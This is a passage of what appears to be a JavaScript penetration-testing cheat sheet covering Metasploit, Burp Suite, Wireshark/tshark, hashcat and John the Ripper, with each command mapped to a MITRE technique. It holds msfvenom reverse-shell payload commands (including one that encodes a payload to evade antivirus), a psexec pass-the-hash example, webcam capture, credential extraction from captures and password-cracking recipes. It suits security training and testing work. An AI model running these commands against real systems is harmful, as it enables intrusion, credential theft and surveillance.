      flags: {},
      example: "meterpreter > webcam_snap\n[*] Starting...\n[+] Got frame\n[*] Webcam shot saved to: /root/webcam.jpg",
      category: "Collection",
      mitre: "T1125"
    },
    {
      tool: "metasploit",
      command: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe",
      description: "Generate a Windows reverse TCP meterpreter payload as an executable.",
      flags: { "-p": "Payload to use", "LHOST": "Listener IP", "LPORT": "Listener port", "-f": "Output format", "-o": "Output file" },
      example: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o shell.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[*] x86/shikata_ga_nai chosen with final size 360",
      category: "Payload Generation",
      mitre: "T1587.001"
    },
    {
      tool: "metasploit",
      command: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf",
      description: "Generate a Linux x64 reverse TCP meterpreter payload as an ELF binary.",
      flags: { "-p": "Payload", "-f": "Format (elf)", "-o": "Output file" },
      example: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o shell.elf",
      category: "Payload Generation",
      mitre: "T1587.001"
    },
    {
      tool: "metasploit",
      command: "msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT>",
      description: "Generate a Python reverse shell one-liner for Unix targets.",
      flags: { "-p": "Payload" },
      example: "msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.2 LPORT=4444",
      category: "Payload Generation",
      mitre: "T1059.006"
    },
    {
      tool: "metasploit",
      command: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp -o shell.asp",
      description: "Generate an ASP reverse shell for IIS web servers.",
      flags: { "-f": "Format (asp)" },
      example: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f asp -o shell.asp",
      category: "Payload Generation",
      mitre: "T1587.001"
    },
    {
      tool: "metasploit",
      command: "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o shell.war",
      description: "Generate a JSP reverse shell as a WAR file for Tomcat deployment.",
      flags: { "-f": "Format (war)" },
      example: "msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war -o shell.war",
      category: "Payload Generation",
      mitre: "T1587.001"
    },
    {
      tool: "metasploit",
      command: "msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.php",
      description: "Generate a PHP meterpreter reverse shell.",
      flags: { "-f": "Format (raw PHP)" },
      example: "msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f raw -o shell.php",
      category: "Payload Generation",
      mitre: "T1587.001"
    },
    {
      tool: "metasploit",
      command: "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=<IP> LPORT=<PORT> -f exe -o encoded.exe",
      description: "Generate encoded payload to evade antivirus. Uses shikata_ga_nai encoder with 5 iterations.",
      flags: { "-e": "Encoder to use", "-i": "Encoding iterations" },
      example: "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=10.10.14.2 LPORT=4444 -f exe -o encoded.exe",
      category: "Payload Generation",
      mitre: "T1027"
    },
    {
      tool: "metasploit",
      command: "search type:exploit platform:windows smb",
      description: "Search Metasploit module database for Windows SMB exploits.",
      flags: { "type:": "Module type (exploit, auxiliary, post, payload)", "platform:": "Target platform" },
      example: "msf6 > search type:exploit platform:windows smb\n# Matching Modules\n# exploit/windows/smb/ms17_010_eternalblue\n# exploit/windows/smb/ms08_067_netapi\n# exploit/windows/smb/psexec",
      category: "Search",
      mitre: "T1588.002"
    },
    {
      tool: "metasploit",
      command: "use auxiliary/server/socks_proxy",
      description: "Start a SOCKS proxy server for pivoting through compromised networks.",
      flags: { "set SRVPORT": "Proxy port", "set VERSION": "SOCKS version (4a/5)" },
      example: "msf6 > use auxiliary/server/socks_proxy\nmsf6 > set SRVPORT 1080\nmsf6 > set VERSION 5\nmsf6 > run -j",
      category: "Pivoting",
      mitre: "T1090"
    },
    {
      tool: "metasploit",
      command: "use exploit/windows/smb/psexec",
      description: "PsExec-style exploitation using SMB credentials to execute payloads remotely.",
      flags: { "set RHOSTS": "Target", "set SMBUser": "Username", "set SMBPass": "Password or NTLM hash" },
      example: "msf6 > use exploit/windows/smb/psexec\nmsf6 > set RHOSTS 10.10.10.5\nmsf6 > set SMBUser administrator\nmsf6 > set SMBPass aad3b435:31d6cfe0d16ae931\nmsf6 > exploit",
      category: "Lateral Movement",
      mitre: "T1021.002"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // BURP SUITE
  // ═══════════════════════════════════════════════════════════════════════════
  burp_suite: [
    {
      tool: "burp_suite",
      command: "Proxy > Intercept > Forward/Drop",
      description: "Intercept HTTP/HTTPS requests between browser and target. Modify requests before forwarding or drop them entirely.",
      flags: { "Forward": "Send the (possibly modified) request to the server", "Drop": "Discard the request", "Intercept is on/off": "Toggle interception" },
      example: "1. Configure browser proxy to 127.0.0.1:8080\n2. Navigate to target URL\n3. Modify intercepted request\n4. Click Forward",
      category: "Proxy",
      mitre: "T1557"
    },
    {
      tool: "burp_suite",
      command: "Intruder > Sniper Attack",
      description: "Single payload set cycled through each marked position one at a time. Good for fuzzing individual parameters.",
      flags: { "Positions": "Mark injection points with §", "Payloads": "Define payload list or generator" },
      example: "Target: POST /login\nPayload position: username=§admin§&password=test\nPayload list: admin, root, administrator, user\nResult: Tests each username individually",
      category: "Fuzzing",
      mitre: "T1110"
    },
    {
      tool: "burp_suite",
      command: "Intruder > Battering Ram Attack",
      description: "Single payload set inserted into all marked positions simultaneously. Useful when the same value must appear in multiple places.",
      flags: {},
      example: "Positions: Cookie: session=§value§ + Header: X-Token: §value§\nPayload: token123\nResult: Same payload in all positions at once",
      category: "Fuzzing",
      mitre: "T1110"
    },
    {
      tool: "burp_suite",
      command: "Intruder > Pitchfork Attack",
      description: "Multiple payload sets, one per position, cycled in parallel. Position 1 gets payload 1 from set 1, position 2 gets payload 1 from set 2, etc.",
      flags: {},
      example: "Position 1 (username): admin, user, test\nPosition 2 (password): admin123, user123, test123\nTests: admin:admin123, user:user123, test:test123",
      category: "Fuzzing",
      mitre: "T1110.004"
    },
    {
      tool: "burp_suite",
      command: "Intruder > Cluster Bomb Attack",
      description: "Multiple payload sets testing all combinations. Tests every permutation of payloads across all positions.",
      flags: {},
      example: "Position 1 (username): admin, user (2 payloads)\nPosition 2 (password): pass1, pass2, pass3 (3 payloads)\nTotal requests: 2 × 3 = 6 combinations",
      category: "Fuzzing",
      mitre: "T1110.003"
    },
    {
      tool: "burp_suite",
      command: "Repeater > Send",
      description: "Manually modify and resend individual HTTP requests. Essential for testing parameter tampering, injection, and authentication bypass.",
      flags: { "Send": "Send request and view response", "Follow redirections": "Auto-follow 3xx redirects" },
      example: "1. Right-click request in Proxy history > Send to Repeater\n2. Modify parameters (e.g., change id=1 to id=2)\n3. Click Send\n4. Analyze response for IDOR or other issues",
      category: "Manual Testing",
      mitre: "T1190"
    },
    {
      tool: "burp_suite",
      command: "Scanner > Active Scan",
      description: "Automated vulnerability scanner that sends attack payloads to discover XSS, SQLi, XXE, SSRF, and other web vulnerabilities.",
      flags: { "Scan configuration": "Select audit checks", "Resource pool": "Control scan speed/threads" },
      example: "1. Right-click target in site map > Scan\n2. Select 'Active scan'\n3. Configure scan points and checks\n4. Review Issues tab for findings",
      category: "Vulnerability Assessment",
      mitre: "T1595.002"
    },
    {
      tool: "burp_suite",
      command: "Sequencer > Live Capture",
      description: "Analyze randomness and entropy of session tokens, CSRF tokens, or any other values to assess their predictability.",
      flags: {},
      example: "1. Configure live capture request\n2. Capture 10,000+ tokens\n3. Run analysis\n4. Check effective entropy bits (should be >64 for session tokens)",
      category: "Assessment",
      mitre: "T1539"
    },
    {
      tool: "burp_suite",
      command: "Decoder > Encode/Decode",
      description: "Encode and decode data in various formats: URL, HTML, Base64, ASCII hex, gzip, etc.",
      flags: {},
      example: "Input: <script>alert(1)</script>\nURL Encode: %3Cscript%3Ealert%281%29%3C%2Fscript%3E\nBase64: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\nHTML: &lt;script&gt;alert(1)&lt;/script&gt;",
      category: "Encoding",
      mitre: "T1140"
    },
    {
      tool: "burp_suite",
      command: "Comparer > Compare Responses",
      description: "Visually compare two HTTP responses to find subtle differences. Useful for timing attacks and blind injection.",
      flags: { "Words": "Compare by words", "Bytes": "Compare by bytes" },
      example: "1. Send two requests with different payloads\n2. Send responses to Comparer\n3. Click 'Words' or 'Bytes'\n4. Differences highlighted in color",
      category: "Analysis",
      mitre: "T1190"
    },
    {
      tool: "burp_suite",
      command: "Match and Replace Rules",
      description: "Automatically modify requests/responses passing through the proxy. Useful for adding headers, removing protections, changing User-Agents.",
      flags: {},
      example: "Proxy > Options > Match and Replace\nMatch: X-Forwarded-For: (leave empty)\nReplace: X-Forwarded-For: 127.0.0.1\nType: Request header\nResult: All requests get X-Forwarded-For: 127.0.0.1",
      category: "Proxy",
      mitre: "T1557"
    },
    {
      tool: "burp_suite",
      command: "Target > Scope Configuration",
      description: "Define which hosts/URLs are in-scope for testing. Out-of-scope traffic can be automatically dropped.",
      flags: {},
      example: "Include in scope: *.target.com\nExclude from scope: logout.target.com\nProxy > Options > 'Don't send out of scope items to history'",
      category: "Configuration",
      mitre: "T1595"
    },
    {
      tool: "burp_suite",
      command: "Collaborator Client",
      description: "Out-of-band interaction testing server. Generates unique payloads that phone home when triggered (DNS, HTTP, SMTP).",
      flags: {},
      example: "1. Burp > Collaborator client > Copy to clipboard\n2. Get unique subdomain: xyz123.burpcollaborator.net\n3. Inject in SSRF test: url=http://xyz123.burpcollaborator.net\n4. Poll for interactions — DNS/HTTP hit confirms SSRF",
      category: "Vulnerability Assessment",
      mitre: "T1190"
    },
    {
      tool: "burp_suite",
      command: "Session Handling Rules + Macros",
      description: "Automate session management — re-authenticate, fetch CSRF tokens, maintain session validity during scanning.",
      flags: {},
      example: "1. Project Options > Sessions > Session handling rules\n2. Add rule: 'Check session is valid'\n3. Define macro: Login sequence (GET /login -> POST /login)\n4. Configure: 'If session is invalid, run macro'",
      category: "Configuration",
      mitre: "T1539"
    },
    {
      tool: "burp_suite",
      command: "WebSocket Testing",
      description: "Intercept, modify, and replay WebSocket messages. View message history and manipulate bidirectional communication.",
      flags: {},
      example: "1. Proxy > WebSockets history\n2. Select message > Send to Repeater\n3. Modify JSON payload: {\"action\":\"getUser\",\"id\":\"1 OR 1=1\"}\n4. Send and analyze response",
      category: "Manual Testing",
      mitre: "T1190"
    },
    {
      tool: "burp_suite",
      command: "Invisible Proxying",
      description: "Proxy non-proxy-aware clients by acting as a transparent proxy. Useful for thick clients and mobile apps.",
      flags: {},
      example: "Proxy > Options > Proxy Listeners > Edit\nCheck 'Support invisible proxying'\nRedirect traffic via hosts file or DNS to Burp's IP",
      category: "Proxy",
      mitre: "T1557"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // WIRESHARK / TSHARK
  // ═══════════════════════════════════════════════════════════════════════════
  wireshark: [
    {
      tool: "wireshark",
      command: "tcp.port == 80",
      description: "Display filter for HTTP traffic on port 80.",
      flags: {},
      example: "Apply in Wireshark filter bar: tcp.port == 80\nShows all HTTP request/response packets",
      category: "Display Filters",
      mitre: "T1040"
    },
    {
      tool: "wireshark",
      command: "ip.addr == 10.10.10.5",
      description: "Display filter to show all traffic to/from a specific IP address.",
      flags: {},
      example: "ip.addr == 10.10.10.5\nShows all packets where source OR destination is 10.10.10.5",
      category: "Display Filters",
      mitre: "T1040"
    },
    {
      tool: "wireshark",
      command: "http.request.method == \"POST\"",
      description: "Filter for HTTP POST requests only. Useful for finding form submissions and API calls.",
      flags: {},
      example: "http.request.method == \"POST\"\nReveals login attempts, file uploads, data submissions",
      category: "Display Filters",
      mitre: "T1040"
    },
    {
      tool: "wireshark",
      command: "dns.qry.name contains \"evil\"",
      description: "Filter DNS queries containing a specific string. Useful for detecting C2 DNS tunneling.",
      flags: {},
      example: "dns.qry.name contains \"evil\"\nFinds DNS lookups for domains containing 'evil'",
      category: "Display Filters",
      mitre: "T1071.004"
    },
    {
      tool: "wireshark",
      command: "tcp.flags.syn == 1 && tcp.flags.ack == 0",
      description: "Filter for TCP SYN packets (connection initiations). Useful for detecting port scans.",
      flags: {},
      example: "tcp.flags.syn == 1 && tcp.flags.ack == 0\nShows only initial connection attempts",
      category: "Display Filters",
      mitre: "T1046"
    },
    {
      tool: "wireshark",
      command: "tls.handshake.type == 1",
      description: "Filter TLS Client Hello messages. Shows all new TLS connections being initiated.",
      flags: {},
      example: "tls.handshake.type == 1\nReveals all TLS/SSL connection attempts with SNI values",
      category: "Display Filters",
      mitre: "T1040"
    },
    {
      tool: "wireshark",
      command: "smb2.cmd == 5",
      description: "Filter SMB2 Create requests (file access operations).",
      flags: {},
      example: "smb2.cmd == 5\nShows files being accessed/created over SMB",
      category: "Display Filters",
      mitre: "T1021.002"
    },
    {
      tool: "wireshark",
      command: "kerberos.msg_type == 11",
      description: "Filter Kerberos TGS-REQ messages. Useful for detecting Kerberoasting attacks.",
      flags: {},
      example: "kerberos.msg_type == 11\nTGS requests — high volume from single host may indicate Kerberoasting",
      category: "Display Filters",
      mitre: "T1558.003"
    },
    {
      tool: "wireshark",
      command: "ldap.filter",
      description: "Filter LDAP search operations. Useful for detecting AD enumeration.",
      flags: {},
      example: "ldap\nShows all LDAP traffic including bind, search, and modify operations",
      category: "Display Filters",
      mitre: "T1087.002"
    },
    {
      tool: "wireshark",
      command: "frame contains \"password\"",
      description: "Search packet contents for plaintext passwords. Case-sensitive string match across all frames.",
      flags: {},
      example: "frame contains \"password\"\nSearches raw packet data for the string 'password'",
      category: "Display Filters",
      mitre: "T1040"
    },
    {
      tool: "wireshark",
      command: "Follow > TCP Stream",
      description: "Reconstruct and display the full conversation of a TCP connection. Shows request/response in sequence.",
      flags: {},
      example: "Right-click packet > Follow > TCP Stream\nDisplays full conversation:\nGET /login HTTP/1.1\nHost: target.com\n---\nHTTP/1.1 200 OK\nSet-Cookie: session=abc123",
      category: "Analysis",
      mitre: "T1040"
    },
    {
      tool: "tshark",
      command: "tshark -i eth0 -w capture.pcap",
      description: "Command-line packet capture on interface eth0, saved to pcap file.",
      flags: { "-i": "Capture interface", "-w": "Output file", "-c": "Capture count limit" },
      example: "tshark -i eth0 -w capture.pcap -c 10000\nCaptures 10000 packets to file",
      category: "Capture",
      mitre: "T1040"
    },
    {
      tool: "tshark",
      command: "tshark -r capture.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri",
      description: "Extract HTTP request URLs from a pcap file.",
      flags: { "-r": "Read pcap file", "-Y": "Display filter", "-T fields": "Output specific fields", "-e": "Field to extract" },
      example: "tshark -r capture.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri\ntarget.com\t/login\ntarget.com\t/api/users\ntarget.com\t/admin",
      category: "Analysis",
      mitre: "T1040"
    },
    {
      tool: "tshark",
      command: "tshark -r capture.pcap -Y 'dns' -T fields -e dns.qry.name | sort | uniq -c | sort -rn",
      description: "Extract and count DNS queries from pcap. Useful for finding C2 beaconing or DNS exfiltration.",
      flags: {},
      example: "tshark -r capture.pcap -Y 'dns' -T fields -e dns.qry.name | sort | uniq -c | sort -rn\n   500 evil.c2server.com\n    45 google.com\n    12 microsoft.com",
      category: "Analysis",
      mitre: "T1071.004"
    },
    {
      tool: "tshark",
      command: "tshark -r capture.pcap -Y 'http.request.method==\"POST\"' -T fields -e http.host -e http.request.uri -e http.file_data",
      description: "Extract POST request bodies — reveals submitted credentials and form data.",
      flags: {},
      example: "tshark -r capture.pcap -Y 'http.request.method==\"POST\"' -T fields -e http.host -e http.request.uri -e http.file_data\ntarget.com\t/login\tusername=admin&password=secret123",
      category: "Credential Extraction",
      mitre: "T1040"
    },
    {
      tool: "tshark",
      command: "tshark -r capture.pcap -Y 'tls.handshake.type==1' -T fields -e tls.handshake.extensions_server_name",
      description: "Extract TLS Server Name Indication (SNI) values — reveals HTTPS destinations even when encrypted.",
      flags: {},
      example: "tshark -r capture.pcap -Y 'tls.handshake.type==1' -T fields -e tls.handshake.extensions_server_name\nwww.google.com\nmail.evil-c2.com\napi.target.com",
      category: "Analysis",
      mitre: "T1040"
    },
    {
      tool: "tshark",
      command: "tshark -r capture.pcap -q -z io,stat,30",
      description: "Display I/O statistics in 30-second intervals. Shows traffic volume over time.",
      flags: { "-q": "Quiet — suppress packet output", "-z": "Statistics type" },
      example: "tshark -r capture.pcap -q -z io,stat,30\n| Interval     | Frames | Bytes   |\n| 0.0 - 30.0   | 1234   | 567890  |\n| 30.0 - 60.0  | 5678   | 2345678 |",
      category: "Statistics",
      mitre: "T1040"
    },
    {
      tool: "tshark",
      command: "tshark -r capture.pcap -q -z conv,tcp",
      description: "Display TCP conversation statistics. Shows all connections with byte counts and durations.",
      flags: {},
      example: "tshark -r capture.pcap -q -z conv,tcp\n| Source          | Destination     | Frames | Bytes  | Duration |\n| 192.168.1.50    | 10.10.10.5      | 456    | 123456 | 45.2s    |",
      category: "Statistics",
      mitre: "T1040"
    },
    {
      tool: "tshark",
      command: "tshark -r capture.pcap -q -z protocol,tree",
      description: "Display protocol hierarchy statistics. Shows which protocols are present and their traffic percentage.",
      flags: {},
      example: "tshark -r capture.pcap -q -z protocol,tree\neth     100.00%\n  ip    98.50%\n    tcp  85.20%\n      http 42.10%\n      tls  38.50%\n    udp  13.30%\n      dns  11.20%",
      category: "Statistics",
      mitre: "T1040"
    },
    {
      tool: "tshark",
      command: "tshark -r capture.pcap -Y 'ftp.request.command==\"PASS\"' -T fields -e ftp.request.arg",
      description: "Extract FTP passwords from pcap file.",
      flags: {},
      example: "tshark -r capture.pcap -Y 'ftp.request.command==\"PASS\"' -T fields -e ftp.request.arg\nsecretpass123",
      category: "Credential Extraction",
      mitre: "T1040"
    },
    {
      tool: "wireshark",
      command: "tcp.analysis.retransmission",
      description: "Filter for TCP retransmissions. High retransmission rate may indicate network issues or packet loss.",
      flags: {},
      example: "tcp.analysis.retransmission\nShows retransmitted packets — may indicate interference or DoS",
      category: "Display Filters",
      mitre: "T1040"
    },
    {
      tool: "wireshark",
      command: "arp.opcode == 2",
      description: "Filter ARP replies. Multiple replies from different MACs for the same IP indicates ARP spoofing.",
      flags: {},
      example: "arp.opcode == 2\nAnalyze: do multiple MACs claim the same IP? If so, ARP spoofing detected",
      category: "Display Filters",
      mitre: "T1557.002"
    },
    {
      tool: "wireshark",
      command: "icmp.type == 8",
      description: "Filter ICMP echo requests (pings). Useful for detecting ping sweeps and ICMP tunneling.",
      flags: {},
      example: "icmp.type == 8\nHigh volume from single source suggests ping sweep or ICMP exfiltration",
      category: "Display Filters",
      mitre: "T1018"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // HASHCAT
  // ═══════════════════════════════════════════════════════════════════════════
  hashcat: [
    {
      tool: "hashcat",
      command: "hashcat -m 0 -a 0 hashes.txt wordlist.txt",
      description: "Dictionary attack on MD5 hashes. Tests each word from the wordlist against the hash.",
      flags: { "-m 0": "Hash mode 0 = MD5", "-a 0": "Attack mode 0 = Straight/Dictionary" },
      example: "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt\n# 5f4dcc3b5aa765d61d8327deb882cf99:password",
      category: "Password Cracking",
      mitre: "T1110.002"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 100 -a 0 hashes.txt wordlist.txt",
      description: "Dictionary attack on SHA-1 hashes.",
      flags: { "-m 100": "Hash mode 100 = SHA-1" },
      example: "hashcat -m 100 -a 0 hashes.txt rockyou.txt",
      category: "Password Cracking",
      mitre: "T1110.002"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 1000 -a 0 hashes.txt wordlist.txt",
      description: "Dictionary attack on NTLM hashes (Windows password hashes from SAM/NTDS.dit).",
      flags: { "-m 1000": "Hash mode 1000 = NTLM" },
      example: "hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt\n# 31d6cfe0d16ae931b73c59d7e0c089c0:password123",
      category: "Password Cracking",
      mitre: "T1110.002"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 1800 -a 0 hashes.txt wordlist.txt",
      description: "Dictionary attack on SHA-512 crypt hashes ($6$ prefix — Linux /etc/shadow).",
      flags: { "-m 1800": "Hash mode 1800 = sha512crypt ($6$)" },
      example: "hashcat -m 1800 -a 0 shadow_hashes.txt rockyou.txt",
      category: "Password Cracking",
      mitre: "T1110.002"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 5600 -a 0 hashes.txt wordlist.txt",
      description: "Dictionary attack on NetNTLMv2 hashes (captured via Responder or relay attacks).",
      flags: { "-m 5600": "Hash mode 5600 = NetNTLMv2" },
      example: "hashcat -m 5600 -a 0 ntlmv2_hashes.txt rockyou.txt",
      category: "Password Cracking",
      mitre: "T1110.002"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 13100 -a 0 hashes.txt wordlist.txt",
      description: "Dictionary attack on Kerberos 5 TGS-REP (Kerberoasting hashes).",
      flags: { "-m 13100": "Hash mode 13100 = Kerberos 5 TGS-REP etype 23" },
      example: "hashcat -m 13100 -a 0 kerberoast.txt rockyou.txt\n# $krb5tgs$23$*svc_sql*:P@ssw0rd2023",
      category: "Password Cracking",
      mitre: "T1558.003"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 18200 -a 0 hashes.txt wordlist.txt",
      description: "Dictionary attack on Kerberos 5 AS-REP (AS-REP roasting hashes).",
      flags: { "-m 18200": "Hash mode 18200 = Kerberos 5 AS-REP etype 23" },
      example: "hashcat -m 18200 -a 0 asrep.txt rockyou.txt",
      category: "Password Cracking",
      mitre: "T1558.004"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 22000 -a 0 hashes.txt wordlist.txt",
      description: "Dictionary attack on WPA-PBKDF2-PMKID+EAPOL (WiFi handshake hashes).",
      flags: { "-m 22000": "Hash mode 22000 = WPA-PBKDF2-PMKID+EAPOL" },
      example: "hashcat -m 22000 -a 0 wifi.hc22000 rockyou.txt",
      category: "Password Cracking",
      mitre: "T1110.002"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 1400 -a 0 hashes.txt wordlist.txt",
      description: "Dictionary attack on SHA-256 hashes.",
      flags: { "-m 1400": "Hash mode 1400 = SHA-256" },
      example: "hashcat -m 1400 -a 0 sha256.txt rockyou.txt",
      category: "Password Cracking",
      mitre: "T1110.002"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 3200 -a 0 hashes.txt wordlist.txt",
      description: "Dictionary attack on bcrypt hashes ($2*$ prefix). Very slow due to bcrypt's design.",
      flags: { "-m 3200": "Hash mode 3200 = bcrypt" },
      example: "hashcat -m 3200 -a 0 bcrypt.txt rockyou.txt -w 3",
      category: "Password Cracking",
      mitre: "T1110.002"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 500 -a 0 hashes.txt wordlist.txt",
      description: "Dictionary attack on md5crypt hashes ($1$ prefix — older Linux passwords).",
      flags: { "-m 500": "Hash mode 500 = md5crypt ($1$)" },
      example: "hashcat -m 500 -a 0 md5crypt.txt rockyou.txt",
      category: "Password Cracking",
      mitre: "T1110.002"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 7500 -a 0 hashes.txt wordlist.txt",
      description: "Dictionary attack on Kerberos 5 AS-REQ Pre-Auth etype 23.",
      flags: { "-m 7500": "Hash mode 7500 = Kerberos 5 AS-REQ" },
      example: "hashcat -m 7500 -a 0 krb5_asreq.txt rockyou.txt",
      category: "Password Cracking",
      mitre: "T1558"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 1000 -a 1 hashes.txt wordlist1.txt wordlist2.txt",
      description: "Combination attack. Appends each word from wordlist2 to each word in wordlist1.",
      flags: { "-a 1": "Attack mode 1 = Combination" },
      example: "hashcat -m 1000 -a 1 ntlm.txt base_words.txt suffixes.txt\n# Tries: password123, password456, admin123, admin456...",
      category: "Password Cracking",
      mitre: "T1110.002"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?d?d?d",
      description: "Brute-force attack with mask. Defines character sets per position.",
      flags: { "-a 3": "Attack mode 3 = Brute-force/Mask", "?u": "Uppercase letter", "?l": "Lowercase letter", "?d": "Digit", "?s": "Special character", "?a": "Any printable character" },
      example: "hashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?d?d?d\n# Tries: Admin123, Hello456, Passw789...",
      category: "Password Cracking",
      mitre: "T1110.001"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 1000 -a 6 hashes.txt wordlist.txt ?d?d?d?d",
      description: "Hybrid attack: wordlist + mask. Appends mask characters to each dictionary word.",
      flags: { "-a 6": "Attack mode 6 = Hybrid Wordlist+Mask" },
      example: "hashcat -m 1000 -a 6 ntlm.txt rockyou.txt ?d?d?d?d\n# Tries: password0000, password0001, admin1234...",
      category: "Password Cracking",
      mitre: "T1110.002"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 1000 -a 7 hashes.txt ?d?d?d?d wordlist.txt",
      description: "Hybrid attack: mask + wordlist. Prepends mask characters to each dictionary word.",
      flags: { "-a 7": "Attack mode 7 = Hybrid Mask+Wordlist" },
      example: "hashcat -m 1000 -a 7 ntlm.txt ?d?d?d?d rockyou.txt\n# Tries: 0000password, 1234admin, 2023summer...",
      category: "Password Cracking",
      mitre: "T1110.002"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule",
      description: "Dictionary attack with rules. best64.rule applies 64 common transformations to each word.",
      flags: { "-r": "Rule file — applies transformations to wordlist entries" },
      example: "hashcat -m 0 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n# Transforms: password -> Password, PASSWORD, password1, p@ssword, etc.",
      category: "Password Cracking",
      mitre: "T1110.002"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/dive.rule",
      description: "Dictionary attack with dive.rule — more aggressive rule set with thousands of transformations.",
      flags: { "-r rules/dive.rule": "Dive rule — extensive transformation set" },
      example: "hashcat -m 0 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule",
      category: "Password Cracking",
      mitre: "T1110.002"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 1000 hashes.txt wordlist.txt -w 3 -O --force",
      description: "Performance-tuned cracking session. Workload profile 3 (high), optimized kernels, force on unsupported GPU.",
      flags: { "-w 3": "Workload profile 3 = High (uses more GPU resources)", "-O": "Enable optimized kernels (limits password length to 31)", "--force": "Force execution on unsupported hardware" },
      example: "hashcat -m 1000 ntlm.txt rockyou.txt -w 3 -O\nSpeed.#1: 25000.0 MH/s (high workload mode)",
      category: "Performance",
      mitre: "T1110.002"
    },
    {
      tool: "hashcat",
      command: "hashcat -m 1000 hashes.txt wordlist.txt --show",
      description: "Show previously cracked hashes from the potfile without re-cracking.",
      flags: { "--show": "Display cracked hashes from potfile" },
      example: "hashcat -m 1000 ntlm.txt rockyou.txt --show\n31d6cfe0d16ae931:password123\naad3b435b51404ee:admin",
      category: "Utility",
      mitre: "T1110.002"
    },
    {
      tool: "hashcat",
      command: "hashcat --example-hashes | grep -A2 '1000'",
      description: "Show example hash formats. Essential for identifying hash types.",
      flags: { "--example-hashes": "Display example hashes for all modes" },
      example: "hashcat --example-hashes | grep -B1 -A2 'NTLM'\nHash mode #1000\nName: NTLM\nExample: b4b9b02e6f09a9bd760f388b67351e2b",
      category: "Utility",
      mitre: "T1110"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // JOHN THE RIPPER
  // ═══════════════════════════════════════════════════════════════════════════
  john: [
    {
      tool: "john",
      command: "john --wordlist=rockyou.txt hashes.txt",
      description: "Wordlist mode — test each password from the wordlist against hashes.",
      flags: { "--wordlist": "Path to wordlist file" },
      example: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\nLoaded 5 password hashes\npassword         (admin)\nsecret123        (user1)",
      category: "Password Cracking",
      mitre: "T1110.002"
    },
    {
      tool: "john",
      command: "john --wordlist=rockyou.txt --rules hashes.txt",
      description: "Wordlist mode with mangling rules. Applies transformations like capitalization, number appending.",
      flags: { "--rules": "Apply word mangling rules", "--rules=All": "Apply all rule sets" },
      example: "john --wordlist=rockyou.txt --rules hashes.txt",
      category: "Password Cracking",
      mitre: "T1110.002"
    },
    {
      tool: "john",
      command: "john --incremental hashes.txt",
      description: "Incremental (brute force) mode. Tries all possible character combinations.",
      flags: { "--incremental": "Brute force mode", "--incremental=Digits": "Digits only", "--incremental=Alpha": "Letters only" },
      example: "john --incremental=Alnum hashes.txt\n# Tries: a, b, ..., aa, ab, ..., aaa, ...",
      category: "Password Cracking",
      mitre: "T1110.001"
    },
    {
      tool: "john",
      command: "john --format=NT hashes.txt",
      description: "Specify hash format explicitly. Use when auto-detection fails.",
      flags: { "--format": "Hash format (NT, Raw-SHA256, Raw-MD5, bcrypt, etc.)" },
      example: "john --format=NT --wordlist=rockyou.txt ntlm_hashes.txt",
      category: "Password Cracking",
      mitre: "T1110.002"
    },
    {
      tool: "john",
      command: "john --show hashes.txt",
      description: "Display previously cracked passwords.",
      flags: { "--show": "Show cracked passwords" },
      example: "john --show hashes.txt\nadmin:password123\nuser1:letmein\n2 password hashes cracked, 3 left",
      category: "Utility",
      mitre: "T1110"
    },
    {
      tool: "john",
      command: "john --list=formats",
